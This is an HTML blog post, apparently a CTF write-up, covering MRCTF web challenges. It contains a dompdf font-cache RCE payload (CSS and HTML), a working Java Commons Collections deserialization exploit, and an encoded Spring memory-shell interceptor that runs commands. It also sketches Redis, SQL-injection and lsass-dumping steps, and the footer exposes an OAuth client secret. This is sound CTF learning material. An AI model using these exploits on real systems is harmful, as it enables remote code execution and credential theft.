@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta content="yes" name="apple-mobile-web-app-capable" />
+  <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+  <meta name="referrer" content="never">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+  <meta name="author" content="kveln">
+  <title>MRCTF |  </title>
+  <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  <link rel="alternate" type="application/rss+xml" title="MRCTF |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+    <meta property="og:description" content="MRCTF"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/tLCxJb1Sl/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content=" "/>
+  </head>
+  <body>
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/">首页</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/archives">归档</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/post/about">关于</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/tags">分类</a>
+              
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
+            
+        </span>
+            <h1>MRCTF</h1>
+            <span class="meta">
+            	Posted on
+              2022-04-24，7 min read
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <h1 id="tprint">Tprint</h1>
+<p>/runtime/log/202204/23.log<br>
+有个Admin控制器<br>
+直接index.php?s=Admin<br>
+能文件上传。并且目录可控。但是不能跨到storage目录外<br>
+<img src="https://guokeya.github.io/post-images/1650794948383.png" alt="" loading="lazy"><br>
+根目录有个指定文件名输出pdf的接口</p>
+<pre><code>/public/index.php?s=Printer/print&amp;page=/public/storage/static/20220424/8af39fce798b3cd3bf2f7155488f9808.css
+</code></pre>
+<p>大概率就是打组件洞<br>
+google下发现最近出了个pdfdom的RCE。<br>
+<code>https://github.com/positive-security/dompdf-rce</code><br>
+简单试了下。靶机貌似不出网<br>
+把所有文件都传到靶机上。靶机web通过报错知道是81端口<br>
+并且。github中的exploit_fonts.php在这题中不能直接用。嘚自己找个ttf。不能带<code>&lt;?</code><br>
+然后就一样了。<br>
+上传ttf的恶意文件<br>
+恶意的css</p>
+<pre><code>@font-face {
+    font-family:'exploitfont';
+    src:url('http://127.0.0.1:81/public/storage/static/20220424/cbf2066d1606641d7c2358b7d6f9daf1.php');
+    font-weight:'normal';
+    font-style:'normal';
+  }
+</code></pre>
+<p>恶意的html</p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;style&gt;
+body {
+    display: block;
+    text-align: center;
+}
+&lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1&gt;&lt;link rel=stylesheet href='http://127.0.0.1:81/public/storage/static/20220424/0d527e00f4807b4bcf101c239866ea77.css'&gt;&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
+</code></pre>
+<p>接口触发。就行了。<br>
+然后找文件。由于web是在/的。可以访问到tp vendor目录<br>
+触发后文件生成在<br>
+vendor/dompdf/dompdf/lib/fonts/exploitfont-normal_md5(css中指向的php链接).php</p>
+<h1 id="webcheckin">WebCheckIn</h1>
+<p>绷不住了。只能传php。其他文件都是回显index。<br>
+php直接报new Error(1)异常就绕过了。<br>
+然后flag。。。。/var/log/dpkg.log</p>
+<h1 id="ezjava">ezjava</h1>
+<p>先上exp</p>
+<pre><code>import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import javassist.ClassPool;
+import javassist.CtClass;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.*;
+import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+
+import javax.xml.transform.Templates;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
+import java.util.*;
+
+public class main {
+
+    public static void main(String[] args) throws Exception {
+        byte[] bytes = ClassPool.getDefault().get(exp.class.getName()).toBytecode();
+        byte[][] bytecode = new byte[][]{bytes};
+        HashMap innermap = new HashMap();
+        TemplatesImpl templates = TemplatesImpl.class.newInstance();
+        setField(templates,&quot;_bytecodes&quot;,bytecode);
+        setField(templates,&quot;_name&quot;,&quot;test&quot;);
+        setField(templates,&quot;_class&quot;,null);
+        LazyMap map = (LazyMap)LazyMap.decorate(innermap,new FactoryTransformer(new InstantiateFactory(TrAXFilter.class,new Class[]{Templates.class},new Object[]{templates})));
+
+        TiedMapEntry tiedmap = new TiedMapEntry(map,123);
+
+        HashSet hashset = new HashSet(1);
+        hashset.add(&quot;foo&quot;);
+
+        Field field = Class.forName(&quot;java.util.HashSet&quot;).getDeclaredField(&quot;map&quot;);
+        field.setAccessible(true);
+        HashMap hashset_map = (HashMap) field.get(hashset);
+
+        Field table = Class.forName(&quot;java.util.HashMap&quot;).getDeclaredField(&quot;table&quot;);
+        table.setAccessible(true);
+        Object[] array = (Object[])table.get(hashset_map);
+
+        Object node = array[0];
+        if(node == null){
+            node = array[1];
+        }
+
+        Field key = node.getClass().getDeclaredField(&quot;key&quot;);
+        key.setAccessible(true);
+        key.set(node,tiedmap);
+
+        try{
+            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc6&quot;));
+            outputStream.writeObject(hashset);
+            outputStream.close();
+
+            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc6&quot;));
+            Path file = Paths.get(&quot;cc6&quot;);
+            System.out.println(Base64.getEncoder().encodeToString(Files.readAllBytes(file)));
+            inputStream.readObject();
+        }catch(Exception e){
+            e.printStackTrace();
+        }
+    }
+    public static void setField(Object obj, String field,Object value) throws Exception {
+        Field f = obj.getClass().getDeclaredField(field);
+        f.setAccessible(true);
+        f.set(obj,value);
+    }
+}
+</code></pre>
+<p>exp.java</p>
+<pre><code>import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import org.springframework.util.Base64Utils;
+import org.springframework.web.context.WebApplicationContext;
+import org.springframework.web.context.request.RequestContextHolder;
+import org.springframework.web.servlet.handler.AbstractHandlerMapping;
+
+import java.io.IOException;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+import java.util.ArrayList;
+public class exp extends AbstractTranslet {
+    static {
+        try {
+            printName();
+        } catch (NoSuchFieldException e) {
+            e.printStackTrace();
+        } catch (ClassNotFoundException e) {
+            e.printStackTrace();
+        } catch (InvocationTargetException e) {
+            e.printStackTrace();
+        } catch (NoSuchMethodException e) {
+            e.printStackTrace();
+        } catch (IllegalAccessException e) {
+            e.printStackTrace();
+        } catch (InstantiationException e) {
+            e.printStackTrace();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+    public static void printName() throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException, InstantiationException, IOException {
+        Runtime.getRuntime().exec(&quot;calc.exe&quot;);
+        String className = &quot;GuokeController&quot;;
+        byte[] bytes = Base64Utils.decodeFromString(&quot;yv66vgAAADQAiAoAIABGCABHCwBIAEkLAEoASwgATAgATQoATgBPCgAMAFAIAFEKAAwAUgcAUwcAVAgAVQgAVgoACwBXCABYCABZBwBaCgALAFsKAFwAXQoAEgBeCABfCgASAGAKABIAYQoAEgBiCgASAGMKAGQAZQoAZABmCgBkAGMHAGcHAGgHAGkBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEUxHdW9rZUNvbnRyb2xsZXI7AQAJcHJlSGFuZGxlAQBkKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDspWgEAAXABABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEABndyaXRlcgEAFUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAAW8BABJMamF2YS9sYW5nL1N0cmluZzsBAAFjAQATTGphdmEvdXRpbC9TY2FubmVyOwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAdoYW5kbGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAEY29kZQEADVN0YWNrTWFwVGFibGUHAFQHAGoHAFMHAFoHAGgHAGsHAGwHAG0HAGcBAApFeGNlcHRpb25zAQAKU291cmNlRmlsZQEAFEd1b2tlQ29udHJvbGxlci5qYXZhDAAhACIBAApndW9rZTEyMTM4BwBrDABuAG8HAGwMAHAAcQEAAAEAB29zLm5hbWUHAHIMAHMAbwwAdAB1AQADd2luDAB2AHcBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIBABBqYXZhL2xhbmcvU3RyaW5nAQAHY21kLmV4ZQEAAi9jDAAhAHgBAAcvYmluL3NoAQACLWMBABFqYXZhL3V0aWwvU2Nhbm5lcgwAeQB6BwB7DAB8AH0MACEAfgEAAlxBDAB/AIAMAIEAggwAgwB1DACEACIHAGoMAIUAhgwAhwAiAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAD0d1b2tlQ29udHJvbGxlcgEAQW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvaGFuZGxlci9IYW5kbGVySW50ZXJjZXB0b3JBZGFwdGVyAQATamF2YS9pby9QcmludFdyaXRlcgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAEGphdmEvbGFuZy9PYmplY3QBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAHaGFzTmV4dAEAAygpWgEABG5leHQBAAVjbG9zZQEABXdyaXRlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAFZmx1c2gAIQAfACAAAAAAAAIAAQAhACIAAQAjAAAALwABAAEAAAAFKrcAAbEAAAACACQAAAAGAAEAAAAFACUAAAAMAAEAAAAFACYAJwAAAAEAKAApAAIAIwAAAboABgAJAAAArysSArkAAwIAOgQZBMYAoSy5AAQBADoFEgU6BhIGuAAHtgAIEgm2AAqZACK7AAtZBr0ADFkDEg1TWQQSDlNZBRkEU7cADzoHpwAfuwALWQa9AAxZAxIQU1kEEhFTWQUZBFO3AA86B7sAElkZB7YAE7YAFLcAFRIWtgAXOggZCLYAGJkACxkItgAZpwAFGQY6BhkItgAaGQUZBrYAGxkFtgAcGQW2AB2nAAU6BQOsBKwAAQAPAKYAqQAeAAMAJAAAAEYAEQAAAAcACgAIAA8ACgAXAAsAGwANACsADgBKABAAZgASAHwAEwCQABQAlQAVAJwAFgChABcApgAZAKkAGACrABoArQAcACUAAABmAAoARwADACoAKwAHABcAjwAsAC0ABQAbAIsALgAvAAYAZgBAACoAKwAHAHwAKgAwADEACAAAAK8AJgAnAAAAAACvADIAMwABAAAArwA0ADUAAgAAAK8ANgA3AAMACgClADgALwAEADkAAAA5AAf+AEoHADoHADsHADr8ABsHADz8ACUHAD1BBwA6/wAaAAUHAD4HAD8HAEAHAEEHADoAAQcAQgEBAEMAAAAEAAEAHgABAEQAAAACAEU&quot;);
+        //控制器的bytecode
+        ClassLoader classLoader = Thread.currentThread().getClass().getClassLoader();
+        Method method = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);
+        method.setAccessible(true);
+        method.invoke(classLoader, className, bytes, 0, bytes.length);
+        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);
+        AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping) context.getBean(&quot;requestMappingHandlerMapping&quot;);
+        Field field = AbstractHandlerMapping.class.getDeclaredField(&quot;adaptedInterceptors&quot;);
+        field.setAccessible(true);
+        ArrayList&lt;Object&gt; adaptedInterceptors = (ArrayList&lt;Object&gt;) field.get(abstractHandlerMapping);
+        adaptedInterceptors.add(classLoader.loadClass(className).newInstance());
+    }
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+}
+</code></pre>
+<p>cc链常用链式调用runtimeexec。要么就是实例化触发TrAXFilter然后打TemplatesImpl等<br>
+这里serializekill把中间的链子和runtime的利用点ban了。但是还是可以通过TraxFilter打Templatesimpl然后定义字节码。<br>
+同样的。cc6改改就行。<br>
+现在能触发任意的transform方法<br>
+<img src="https://guokeya.github.io/post-images/1650863676126.png" alt="" loading="lazy"><br>
+触发任意的create方法<br>
+<img src="https://guokeya.github.io/post-images/1650863713703.png" alt="" loading="lazy"><br>
+然后就是老链子了。<br>
+<img src="https://guokeya.github.io/post-images/1650863737336.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1650864355066.png" alt="" loading="lazy"></p>
+<h1 id="bonus系列">bonus系列</h1>
+<p>Just Hacking<br>
+redis 6379<br>
+进去拿docker的auths。pull一个flag私有容器。</p>
+<p>Java_mem_shell_Basic<br>
+tomcat war部署</p>
+<p>Java_mem_shell_Filter<br>
+log4j。dump jvm内存</p>
+<p>Isass<br>
+/book/<br>
+admin 123456<br>
+后台有个添加的功能点。sql注入差异备份写shell<br>
+1day提system。dump lsass拿flag</p>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/C8x85WhYu/">
+              <span class="post-title">
+                2022红明谷初赛web&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalk = new Gitalk({
+    clientID: 'c07e068ab9501a423854',
+    clientSecret: '33e8ada317c799c9a4ca5cbbb2070ff5a423903b',
+    repo: 'Message',
+    owner: 'guokeya',
+    admin: ['guokeya'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+  gitalk.render('gitalk-container')
+</script>
+
+          
+          
+        
+        </div>
+      </div>
+    </div>
+  </article>
+ <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            
+            
+            <li class="list-inline-item">
+              <a href="http://github.com/guokeya" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+              <li class="list-inline-item">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+              </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea<br ><!--test--></a></p>
+        </div>
+      </div>
+    </div>
+   </footer>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+  <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
+<a id="back_to_top" href="#" class="back_to_top">
+  <span>▲</span></a>
+<script>$(document).ready((function(_this) {
+    return function() {
+      var bt;
+      bt = $('#back_to_top');
+      if ($(document).width() > 480) {
+        $(window).scroll(function() {
+          var st;
+          st = $(window).scrollTop();
+          if (st > 30) {
+            return bt.css('display', 'block')
+          } else {
+            return bt.css('display', 'none')
+          }
+        });
+        return bt.click(function() {
+          $('body,html').animate({
+            scrollTop: 0
+          },
+          800);
+          return false
+        })
+      }
+    }
+  })(this));</script>
+  </body>
+</html>
+
